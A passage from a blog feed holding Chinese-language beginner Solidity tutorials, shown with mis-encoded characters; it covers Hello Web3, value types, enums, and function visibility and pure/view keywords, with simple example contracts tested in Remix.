ï¼Œåˆèƒ½çœ<code>gas</code>ï¼Œå¤§å®¶è¦å¤šç”¨ï¼ï¼ˆæ³¨æ„ï¼Œç”±äºéƒ¨ç½²æµ‹è¯•æ—¶é—´çš„ä¸åŒï¼Œæ¯ä¸ªå‡½æ•°çš„<code>gas</code>æ¶ˆè€—ä¼šæœ‰æ‰€ä¸åŒï¼Œä½†æ˜¯æ¯”è¾ƒç»“æœä¼šæ˜¯ä¸€è‡´çš„ã€‚ï¼‰</p><p><strong>å¤‡æ³¨:</strong> Solidity 0.8.0ä¹‹å‰çš„ç‰ˆæœ¬ï¼Œ<code>assert</code>æŠ›å‡ºçš„æ˜¯ä¸€ä¸ª <code>panic exception</code>ï¼Œä¼šæŠŠå‰©ä½™çš„ <code>gas</code> å…¨éƒ¨æ¶ˆè€—ï¼Œä¸ä¼šè¿”è¿˜ã€‚æ›´å¤šç»†èŠ‚è§<a href="https://docs.soliditylang.org/en/v0.8.17/control-structures.html">å®˜æ–¹æ–‡æ¡£</a>ã€‚</p><h2 id="å‚è€ƒ">å‚è€ƒ</h2><p><a href="https://www.wtf.academy/docs/solidity-101/HelloWeb3">https://www.wtf.academy/docs/solidity-101/HelloWeb3</a></p><p><a href="https://github.com/AmazingAng/WTF-Solidity">https://github.com/AmazingAng/WTF-Solidity</a></p><p><a href="https://learnblockchain.cn/docs/ethers.js/api.html">https://learnblockchain.cn/docs/ethers.js/api.html</a></p>]]></content>
      
      
      <categories>
          
          <category> Web3 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ä»¥å¤ªåŠ </tag>
            
            <tag> solidity </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Solidityå…¥é—¨å­¦ä¹ (ä¸€)</title>
      <link href="/2025/01/22/Solidity%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0-%E4%B8%80/"/>
      <url>/2025/01/22/Solidity%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0-%E4%B8%80/</url>
      
        <content type="html"><![CDATA[<h2 id="Hello-Web3">Hello Web3</h2><h3 id="Solidityç®€ä»‹">Solidityç®€ä»‹</h3><p><code>Solidity</code>æ˜¯ä¸€ç§ç”¨äºç¼–å†™ä»¥å¤ªåŠè™šæ‹Ÿæœº(<code>EVM</code>)æ™ºèƒ½åˆçº¦çš„ç¼–ç¨‹è¯­è¨€ã€‚</p><h3 id="Hello-Web3-2">Hello Web3</h3><p>ç®€å•çš„ç¨‹åº<code>HelloWeb3.sol</code>å¦‚ä¸‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.21;</span><br><span class="line">contract HelloWeb3&#123;</span><br><span class="line">    string public _string = &quot;Hello Web3!&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨åˆ°<a href="https://remix.ethereum.org/">https://remix.ethereum.org/</a></p><p>è¿›è¡Œç¼–è¯‘å’Œéƒ¨ç½²ï¼Œç‚¹å‡»<code>_string</code>è¾“å‡ºã€‚</p><p><img src="/2025/01/22/Solidity%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0-%E4%B8%80/image-20250122224953662.png" alt="image-20250122224953662"></p><p>ä»£ç ä¸­çš„</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.8.21;</span><br></pre></td></tr></table></figure><p>è¡¨ç¤ºæºæ–‡ä»¶å°†ä¸å…è®¸å°äº 0.8.21 ç‰ˆæœ¬æˆ–å¤§äºç­‰äº 0.9.0 çš„ç¼–è¯‘å™¨ç¼–è¯‘ï¼ˆç¬¬äºŒä¸ªæ¡ä»¶ç”± <code>^</code> æä¾›ï¼‰ã€‚</p><p>å…¶ä¸­</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">string public _string = &quot;Hello Web3!&quot;;</span><br></pre></td></tr></table></figure><p><code>public</code> ä¿®é¥°ç¬¦è¡¨ç¤º <code>_string</code> å˜é‡æ˜¯å…¬å¼€çš„ï¼Œä»»ä½•äººéƒ½å¯ä»¥è¯»å–è¯¥å˜é‡çš„å€¼ã€‚</p><p>Solidity ä¼šè‡ªåŠ¨ä¸º <code>public</code> ä¿®é¥°çš„çŠ¶æ€å˜é‡ç”Ÿæˆä¸€ä¸ª getter å‡½æ•°ï¼Œå…è®¸å¤–éƒ¨ä»£ç ï¼ˆå¦‚å…¶ä»–åˆçº¦æˆ–å¤–éƒ¨ç”¨æˆ·ï¼‰é€šè¿‡åˆçº¦çš„ ABIï¼ˆåº”ç”¨äºŒè¿›åˆ¶æ¥å£ï¼‰è®¿é—®è¿™ä¸ªå˜é‡çš„å€¼ã€‚</p><h2 id="å€¼ç±»å‹">å€¼ç±»å‹</h2><h3 id="Solidityä¸­çš„å˜é‡ç±»å‹">Solidityä¸­çš„å˜é‡ç±»å‹</h3><ol><li><strong>å€¼ç±»å‹(Value Type)</strong>ï¼šåŒ…æ‹¬å¸ƒå°”å‹ã€æ•´æ•°å‹ç­‰ç­‰ï¼Œè¿™ç±»å˜é‡èµ‹å€¼æ—¶å€™ç›´æ¥ä¼ é€’æ•°å€¼ã€‚</li><li><strong>å¼•ç”¨ç±»å‹(Reference Type)</strong>ï¼šåŒ…æ‹¬æ•°ç»„å’Œç»“æ„ä½“ï¼Œè¿™ç±»å˜é‡å ç©ºé—´å¤§ï¼Œèµ‹å€¼æ—¶å€™ç›´æ¥ä¼ é€’åœ°å€ï¼ˆç±»ä¼¼æŒ‡é’ˆï¼‰ã€‚</li><li><strong>æ˜ å°„ç±»å‹(Mapping Type)</strong>ï¼šSolidityä¸­å­˜å‚¨é”®å€¼å¯¹çš„æ•°æ®ç»“æ„ï¼Œå¯ä»¥ç†è§£ä¸ºå“ˆå¸Œè¡¨ã€‚</li></ol><p>ç¼–å†™ä¸€ä¸ªç®€å•çš„ç¨‹åº<code>ValueTypes.sol</code>ï¼Œä»‹ç»ä¸€ä¸‹å„ç§å˜é‡ç±»å‹ï¼Œç¨‹åºå¦‚ä¸‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.4;</span><br><span class="line">contract ValueTypes&#123;</span><br><span class="line">    // å¸ƒå°”å€¼</span><br><span class="line">    bool public _bool = true;</span><br><span class="line">    // å¸ƒå°”è¿ç®—</span><br><span class="line">    bool public _bool1 = !_bool; //å–é</span><br><span class="line">    bool public _bool2 = _bool &amp;&amp; _bool1; //ä¸</span><br><span class="line">    bool public _bool3 = _bool || _bool2; //æˆ–</span><br><span class="line">    bool public _bool4 = _bool == _bool; //ç›¸ç­‰</span><br><span class="line">    bool public _bool5 = _bool != _bool1; //ä¸æƒ³ç­‰</span><br><span class="line">    // æ•´æ•°</span><br><span class="line">    int public _int = -1;</span><br><span class="line">    uint public _uint = 1;</span><br><span class="line">    uint256 public _number = 20250122;</span><br><span class="line">    // æ•´æ•°è¿ç®—</span><br><span class="line">    uint256 public _number1 = _number + 1; // +ï¼Œ-ï¼Œ*ï¼Œ/</span><br><span class="line">    uint256 public _number2 = 2**2; // æŒ‡æ•°</span><br><span class="line">    uint256 public _number3 = 7 % 2; // å–ä½™æ•°</span><br><span class="line">    bool public _numberbool = _number2 &gt; _number3; // æ¯”å¤§å°</span><br><span class="line">    // åœ°å€</span><br><span class="line">    address public _address = 0xAb8483F64d9C6d1EcF9b849Ae677dD3315835cb2;</span><br><span class="line">    address payable public _address1 = payable(_address); // payable addressï¼Œå¯ä»¥è½¬è´¦ã€æŸ¥ä½™é¢</span><br><span class="line">    // åœ°å€ç±»å‹çš„æˆå‘˜</span><br><span class="line">    uint256 public balance = _address1.balance; // balance of address</span><br><span class="line">    // å›ºå®šé•¿åº¦çš„å­—èŠ‚æ•°ç»„</span><br><span class="line">    bytes32 public _byte32 = &quot;MiniSolidity&quot;; </span><br><span class="line">    bytes1 public _byte = _byte32[0];</span><br><span class="line"></span><br><span class="line">    // ç”¨enumå°†uint 0ï¼Œ 1ï¼Œ 2è¡¨ç¤ºä¸ºBuy, Hold, Sell</span><br><span class="line">    enum ActionSet &#123; Buy, Hold, Sell &#125;</span><br><span class="line">    // åˆ›å»ºenumå˜é‡ action</span><br><span class="line">    //ActionSet action = ActionSet.Buy;</span><br><span class="line">    ActionSet action = ActionSet.Buy;</span><br><span class="line">    // enumå¯ä»¥å’Œuintæ˜¾å¼çš„è½¬æ¢</span><br><span class="line">    function enumToUint() external view returns(uint)&#123;</span><br><span class="line">        return uint(action);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="åœ°å€ç±»å‹">åœ°å€ç±»å‹</h3><p>åœ°å€ç±»å‹(address)æœ‰ä¸¤ç±»ï¼š</p><ul><li>æ™®é€šåœ°å€ï¼ˆaddressï¼‰: å­˜å‚¨ä¸€ä¸ª 20 å­—èŠ‚çš„å€¼ï¼ˆä»¥å¤ªåŠåœ°å€çš„å¤§å°ï¼‰ã€‚</li><li>payable address: æ¯”æ™®é€šåœ°å€å¤šäº† <code>transfer</code> å’Œ <code>send</code> ä¸¤ä¸ªæˆå‘˜æ–¹æ³•ï¼Œç”¨äºæ¥æ”¶è½¬è´¦ã€‚</li></ul><h3 id="å®šé•¿å­—èŠ‚æ•°ç»„">å®šé•¿å­—èŠ‚æ•°ç»„</h3><p>å­—èŠ‚æ•°ç»„åˆ†ä¸ºå®šé•¿å’Œä¸å®šé•¿ä¸¤ç§ï¼š</p><ul><li>å®šé•¿å­—èŠ‚æ•°ç»„: å±äºå€¼ç±»å‹ï¼Œæ•°ç»„é•¿åº¦åœ¨å£°æ˜ä¹‹åä¸èƒ½æ”¹å˜ã€‚æ ¹æ®å­—èŠ‚æ•°ç»„çš„é•¿åº¦åˆ†ä¸º <code>bytes1</code>, <code>bytes8</code>, <code>bytes32</code> ç­‰ç±»å‹ã€‚å®šé•¿å­—èŠ‚æ•°ç»„æœ€å¤šå­˜å‚¨ 32 bytes æ•°æ®ï¼Œå³<code>bytes32</code>ã€‚</li><li>ä¸å®šé•¿å­—èŠ‚æ•°ç»„: å±äºå¼•ç”¨ç±»å‹ï¼Œæ•°ç»„é•¿åº¦åœ¨å£°æ˜ä¹‹åå¯ä»¥æ”¹å˜ï¼ŒåŒ…æ‹¬ <code>bytes</code> ç­‰ã€‚</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">// å›ºå®šé•¿åº¦çš„å­—èŠ‚æ•°ç»„</span><br><span class="line">bytes32 public _byte32 = &quot;MiniSolidity&quot;; </span><br><span class="line">bytes1 public _byte = _byte32[0]; </span><br></pre></td></tr></table></figure><p>åœ¨ä¸Šè¿°ä»£ç ä¸­ï¼Œ<code>MiniSolidity</code> å˜é‡ä»¥å­—èŠ‚çš„æ–¹å¼å­˜å‚¨è¿›å˜é‡ <code>_byte32</code>ã€‚å¦‚æœæŠŠå®ƒè½¬æ¢æˆ <code>16 è¿›åˆ¶</code>ï¼Œå°±æ˜¯ï¼š<code>0x4d696e69536f6c69646974790000000000000000000000000000000000000000</code></p><p><code>_byte</code> å˜é‡çš„å€¼ä¸º <code>_byte32</code> çš„ç¬¬ä¸€ä¸ªå­—èŠ‚ï¼Œå³ <code>0x4d</code>ã€‚</p><p><img src="/2025/01/22/Solidity%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0-%E4%B8%80/image-20250122234241902.png" alt="image-20250122234241902"></p><h3 id="æšä¸¾enum">æšä¸¾enum</h3><p>æšä¸¾ï¼ˆ<code>enum</code>ï¼‰æ˜¯ Solidity ä¸­ç”¨æˆ·å®šä¹‰çš„æ•°æ®ç±»å‹ã€‚å®ƒä¸»è¦ç”¨äºä¸º <code>uint</code> åˆ†é…åç§°ï¼Œä½¿ç¨‹åºæ˜“äºé˜…è¯»å’Œç»´æŠ¤ã€‚å®ƒä¸ <code>C è¯­è¨€</code> ä¸­çš„ <code>enum</code> ç±»ä¼¼ï¼Œä½¿ç”¨åç§°æ¥ä»£æ›¿ä» <code>0</code> å¼€å§‹çš„ <code>uint</code>ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">// ç”¨enumå°†uint 0ï¼Œ 1ï¼Œ 2è¡¨ç¤ºä¸ºBuy, Hold, Sell</span><br><span class="line">enum ActionSet &#123; Buy, Hold, Sell &#125;</span><br><span class="line">// åˆ›å»ºenumå˜é‡ action</span><br><span class="line">ActionSet action = ActionSet.Buy;</span><br></pre></td></tr></table></figure><p>æšä¸¾å¯ä»¥æ˜¾å¼åœ°å’Œ <code>uint</code> ç›¸äº’è½¬æ¢ï¼Œå¹¶ä¼šæ£€æŸ¥è½¬æ¢çš„æ­£æ•´æ•°æ˜¯å¦åœ¨æšä¸¾çš„é•¿åº¦å†…ï¼Œå¦åˆ™ä¼šæŠ¥é”™ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">// enumå¯ä»¥å’Œuintæ˜¾å¼çš„è½¬æ¢</span><br><span class="line">function enumToUint() external view returns(uint)&#123;</span><br><span class="line">    return uint(action);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>enum</code> æ˜¯ä¸€ä¸ªæ¯”è¾ƒå†·é—¨çš„å˜é‡ï¼Œå‡ ä¹æ²¡ä»€ä¹ˆäººç”¨ã€‚</p><p><code>enum</code>å’Œ<code>uint</code>ç›¸äº’è½¬æ¢ï¼Œå¦‚ä¸‹ï¼š</p><p><img src="/2025/01/22/Solidity%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0-%E4%B8%80/image-20250122234959766.png" alt="image-20250122234959766"></p><h2 id="å‡½æ•°å’Œå‡½æ•°è¾“å‡º">å‡½æ•°å’Œå‡½æ•°è¾“å‡º</h2><h3 id="å‡½æ•°">å‡½æ•°</h3><h4 id="å‡½æ•°çš„ä»£ç å½¢å¼">å‡½æ•°çš„ä»£ç å½¢å¼</h4><p>Solidity ä¸­å‡½æ•°çš„å½¢å¼(æ–¹æ‹¬å·ä¸­çš„æ˜¯å¯å†™å¯ä¸ å†™çš„å…³é”®å­—)ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">function &lt;function name&gt;(&lt;parameter types&gt;) &#123;internal|external|public|private&#125; [pure|view|payable] [returns (&lt;return types&gt;)]</span><br></pre></td></tr></table></figure><ol><li><p><code>function</code>ï¼šå£°æ˜å‡½æ•°æ—¶çš„å›ºå®šç”¨æ³•ã€‚è¦ç¼–å†™å‡½æ•°ï¼Œå°±éœ€è¦ä»¥ <code>function</code> å…³é”®å­—å¼€å¤´ã€‚</p></li><li><p><code>&lt;function name&gt;</code>ï¼šå‡½æ•°åã€‚</p></li><li><p><code>(&lt;parameter types&gt;)</code>ï¼šåœ†æ‹¬å·å†…å†™å…¥å‡½æ•°çš„å‚æ•°ï¼Œå³è¾“å…¥åˆ°å‡½æ•°çš„å˜é‡ç±»å‹å’Œåç§°ã€‚</p></li><li><p><code>&#123;internal|external|public|private&#125;</code>ï¼šå‡½æ•°å¯è§æ€§è¯´æ˜ç¬¦ï¼Œå…±æœ‰4ç§ã€‚</p><ul><li><p><code>public</code>ï¼šå†…éƒ¨å’Œå¤–éƒ¨å‡å¯è§ã€‚</p></li><li><p><code>private</code>ï¼šåªèƒ½ä»æœ¬åˆçº¦å†…éƒ¨è®¿é—®ï¼Œç»§æ‰¿çš„åˆçº¦ä¹Ÿä¸èƒ½ä½¿ç”¨ã€‚</p></li><li><p><code>external</code>ï¼šåªèƒ½ä»åˆçº¦å¤–éƒ¨è®¿é—®ï¼ˆä½†å†…éƒ¨å¯ä»¥é€šè¿‡ <code>this.f()</code> æ¥è°ƒç”¨ï¼Œ<code>f</code>æ˜¯å‡½æ•°åï¼‰ã€‚</p></li><li><p><code>internal</code>: åªèƒ½ä»åˆçº¦å†…éƒ¨è®¿é—®ï¼Œç»§æ‰¿çš„åˆçº¦å¯ä»¥ç”¨ã€‚</p></li></ul><p><strong>æ³¨æ„1âš ï¸</strong>ï¼šåˆçº¦ä¸­å®šä¹‰çš„å‡½æ•°éœ€è¦æ˜ç¡®æŒ‡å®šå¯è§æ€§ï¼Œå®ƒä»¬æ²¡æœ‰é»˜è®¤å€¼ã€‚</p><p><strong>æ³¨æ„2</strong>âš ï¸ï¼š<code>public|private|internal</code> ä¹Ÿå¯ç”¨äºä¿®é¥°çŠ¶æ€å˜é‡ã€‚<code>public</code>å˜é‡ä¼šè‡ªåŠ¨ç”ŸæˆåŒåçš„<code>getter</code>å‡½æ•°ï¼Œç”¨äºæŸ¥è¯¢æ•°å€¼ã€‚æœªæ ‡æ˜å¯è§æ€§ç±»å‹çš„çŠ¶æ€å˜é‡ï¼Œé»˜è®¤ä¸º<code>internal</code>ã€‚</p></li><li><p><code>[pure|view|payable]</code>ï¼šå†³å®šå‡½æ•°æƒé™/åŠŸèƒ½çš„å…³é”®å­—ã€‚<code>payable</code>ï¼ˆå¯æ”¯ä»˜çš„ï¼‰å¾ˆå¥½ç†è§£ï¼Œå¸¦ç€å®ƒçš„å‡½æ•°ï¼Œè¿è¡Œçš„æ—¶å€™å¯ä»¥ç»™åˆçº¦è½¬å…¥ ETHã€‚</p></li><li><p><code>[returns (&lt;return types&gt;)]</code>ï¼šå‡½æ•°è¿”å›çš„å˜é‡ç±»å‹å’Œåç§°ã€‚</p></li></ol><h4 id="åˆ°åº•ä»€ä¹ˆæ˜¯Pureå’ŒViewï¼Ÿ">åˆ°åº•ä»€ä¹ˆæ˜¯<code>Pure</code>å’Œ<code>View</code>ï¼Ÿ</h4><p><code>solidity</code> å¼•å…¥è¿™ä¸¤ä¸ªå…³é”®å­—ä¸»è¦æ˜¯å› ä¸º ä»¥å¤ªåŠäº¤æ˜“éœ€è¦æ”¯ä»˜gas feeã€‚åˆçº¦çš„çŠ¶æ€å˜é‡å­˜å‚¨åœ¨é“¾ä¸Šï¼Œgas fee å¾ˆè´µï¼Œå¦‚æœè®¡ç®—ä¸æ”¹å˜é“¾ä¸ŠçŠ¶æ€ï¼Œå°±å¯ä»¥ä¸ç”¨ä»˜ <code>gas</code>ã€‚åŒ…å« <code>pure</code> å’Œ <code>view</code> å…³é”®å­—çš„å‡½æ•°æ˜¯ä¸æ”¹å†™é“¾ä¸ŠçŠ¶æ€çš„ï¼Œå› æ­¤ç”¨æˆ·ç›´æ¥è°ƒç”¨å®ƒä»¬æ˜¯ä¸éœ€è¦ä»˜ gas çš„ï¼ˆæ³¨æ„âš ï¸ï¼Œåˆçº¦ä¸­é <code>pure</code>/<code>view</code> å‡½æ•°è°ƒç”¨ <code>pure</code>/<code>view</code> å‡½æ•°æ—¶éœ€è¦ä»˜gasï¼‰ã€‚</p><p>åœ¨ä»¥å¤ªåŠä¸­ï¼Œä»¥ä¸‹è¯­å¥è¢«è§†ä¸ºä¿®æ”¹é“¾ä¸ŠçŠ¶æ€ï¼š</p><ol><li>å†™å…¥çŠ¶æ€å˜é‡ã€‚</li><li>é‡Šæ”¾äº‹ä»¶ã€‚</li><li>åˆ›å»ºå…¶ä»–åˆçº¦ã€‚</li><li>ä½¿ç”¨ <code>selfdestruct</code>.</li><li>é€šè¿‡è°ƒç”¨å‘é€ä»¥å¤ªå¸ã€‚</li><li>è°ƒç”¨ä»»ä½•æœªæ ‡è®° <code>view</code> æˆ– <code>pure</code> çš„å‡½æ•°ã€‚</li><li>ä½¿ç”¨ä½çº§è°ƒç”¨ï¼ˆlow-level callsï¼‰ã€‚</li><li>ä½¿ç”¨åŒ…å«æŸäº›æ“ä½œç çš„å†…è”æ±‡ç¼–ã€‚</li></ol><ul><li><code>pure</code>å‡½æ•°æ—¢ä¸èƒ½è¯»å–ä¹Ÿä¸èƒ½å†™å…¥é“¾ä¸Šçš„çŠ¶æ€å˜é‡ã€‚</li><li><code>view</code>å‡½æ•°èƒ½è¯»å–ä½†ä¸èƒ½å†™å…¥çŠ¶æ€å˜é‡ã€‚</li><li>é<code>pure</code>æˆ–<code>view</code>çš„å‡½æ•°æ—¢å¯ä»¥è¯»å–ä¹Ÿå¯ä»¥å†™å…¥çŠ¶æ€å˜é‡ã€‚</li></ul><h4 id="ä»£ç æµ‹è¯•">ä»£ç æµ‹è¯•</h4><p>æµ‹è¯•ä»£ç <code>FunctionTypes.sol</code>å¦‚ä¸‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.21;</span><br><span class="line">contract FunctionTypes&#123;</span><br><span class="line">    uint256 public number = 5;</span><br><span class="line">    // é»˜è®¤function</span><br><span class="line">    function add() external&#123;</span><br><span class="line">        number = number + 1;</span><br><span class="line">    &#125;</span><br><span class="line">    // éªŒè¯pureå’Œview</span><br><span class="line">    // function addtest() external view&#123;</span><br><span class="line">    //     number = number + 1;</span><br><span class="line">    // &#125;</span><br><span class="line">    </span><br><span class="line">    // pure</span><br><span class="line">    function addPure(uint256 _number) external pure returns(uint256 new_number)&#123;</span><br><span class="line">        new_number = _number + 1;</span><br><span class="line">    &#125;</span><br><span class="line">    // view</span><br><span class="line">    function addView() external view returns(uint256 new_number) &#123;</span><br><span class="line">        new_number = number + 1;</span><br><span class="line">    &#125;</span><br><span class="line">    // internal: å†…éƒ¨å‡½æ•°</span><br><span class="line">    function minus() internal &#123;</span><br><span class="line">        number = number - 1;</span><br><span class="line">    &#125;</span><br><span class="line">    // åˆçº¦å†…çš„å‡½æ•°å¯ä»¥è°ƒç”¨å†…éƒ¨å‡½æ•°</span><br><span class="line">    function minusCall() external &#123;</span><br><span class="line">        minus();</span><br><span class="line">    &#125;</span><br><span class="line">    // payable: é€’é’±ï¼Œèƒ½ç»™åˆçº¦æ”¯ä»˜ethçš„å‡½æ•°</span><br><span class="line">    function minusPayable() external payable returns(uint256 balance) &#123;</span><br><span class="line">        minus();    </span><br><span class="line">        balance = address(this).balance;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="pureå’Œview">pureå’Œview</h5><p>åœ¨ä»£ç ä¸­å®šä¹‰äº†ä¸€ä¸ª<code>add()</code>å‡½æ•°ï¼Œæ¯æ¬¡è°ƒç”¨ä¼šä½¿å¾—<code>number</code>åŠ 1ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">// é»˜è®¤function</span><br><span class="line">function add() external&#123;</span><br><span class="line">    number = number + 1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¦‚æœ <code>add()</code> å‡½æ•°è¢«æ ‡è®°ä¸º <code>pure</code>ï¼Œæ¯”å¦‚ <code>function add() external pure</code>ï¼Œå°±ä¼šæŠ¥é”™ã€‚å› ä¸º <code>pure</code> æ˜¯ä¸èƒ½è¯»å–åˆçº¦é‡Œçš„çŠ¶æ€å˜é‡çš„ï¼Œæ›´ä¸èƒ½æ”¹å†™ã€‚</p><p>ä½¿ç”¨åˆ°äº†<code>pure</code>å‡ºç°çš„æŠ¥é”™ï¼Œå¦‚ä¸‹ï¼š</p><p><img src="/2025/01/22/Solidity%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0-%E4%B8%80/image-20250123030906176.png" alt="image-20250123030906176"></p><p>å¦‚æœä½¿ç”¨<code>view</code>ï¼Œåˆ™ä»£ç ä¼šæŠ¥é”™ï¼Œè¯å®äº†<code>view</code>æ˜¯åªèƒ½è¯»å–è€Œä¸èƒ½å†™å…¥çŠ¶æ€å˜é‡ã€‚</p><p><img src="/2025/01/22/Solidity%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0-%E4%B8%80/image-20250123031819323.png" alt="image-20250123031819323"></p><p>é‚£ <code>pure</code> å‡½æ•°èƒ½åšäº›ä»€ä¹ˆï¼Ÿä¸¾ä¸ªä¾‹å­ï¼Œä½ å¯ä»¥ç»™å‡½æ•°ä¼ é€’ä¸€ä¸ªå‚æ•° <code>_number</code>ï¼Œç„¶åè®©ä»–è¿”å› <code>_number + 1</code>ï¼Œè¿™ä¸ªæ“ä½œä¸ä¼šè¯»å–æˆ–å†™å…¥çŠ¶æ€å˜é‡ã€‚</p><p>å¦‚ä»£ç ä¸­çš„<code>addPure</code>ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">// pure</span><br><span class="line">function addPure(uint256 _number) external pure returns(uint256 new_number)&#123;</span><br><span class="line">    new_number = _number + 1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2025/01/22/Solidity%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0-%E4%B8%80/image-20250123031506521.png" alt="image-20250123031506521"></p><p><code>view</code>è¯»å–çŠ¶æ€å˜é‡ï¼Œç„¶åå¯¹è¯»å–çš„ç»“æœè¿›è¡ŒåŠ 1ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">// view</span><br><span class="line">function addView() external view returns(uint256 new_number) &#123;</span><br><span class="line">    new_number = number + 1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2025/01/22/Solidity%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0-%E4%B8%80/image-20250123032230889.png" alt="image-20250123032230889"></p><h5 id="internalå’Œexternalçš„å¯¹æ¯”">internalå’Œexternalçš„å¯¹æ¯”</h5><p>ä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">// internal: å†…éƒ¨å‡½æ•°</span><br><span class="line">function minus() internal &#123;</span><br><span class="line">    number = number - 1;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// åˆçº¦å†…çš„å‡½æ•°å¯ä»¥è°ƒç”¨å†…éƒ¨å‡½æ•°</span><br><span class="line">function minusCall() external &#123;</span><br><span class="line">    minus();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å®šä¹‰äº†ä¸€ä¸ª <code>internal</code> çš„ <code>minus()</code> å‡½æ•°ï¼Œæ¯æ¬¡è°ƒç”¨ä½¿å¾— <code>number</code> å˜é‡å‡å°‘ 1ã€‚ç”±äº <code>internal</code> å‡½æ•°åªèƒ½ç”±åˆçº¦å†…éƒ¨è°ƒç”¨ï¼Œæˆ‘ä»¬å¿…é¡»å†å®šä¹‰ä¸€ä¸ª <code>external</code> çš„ <code>minusCall()</code> å‡½æ•°ï¼Œå¤–éƒ¨é€šè¿‡å®ƒé—´æ¥è°ƒç”¨å†…éƒ¨çš„ <code>minus()</code> å‡½æ•°ã€‚</p><p><img src="/2025/01/22/Solidity%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0-%E4%B8%80/image-20250123033818196.png" 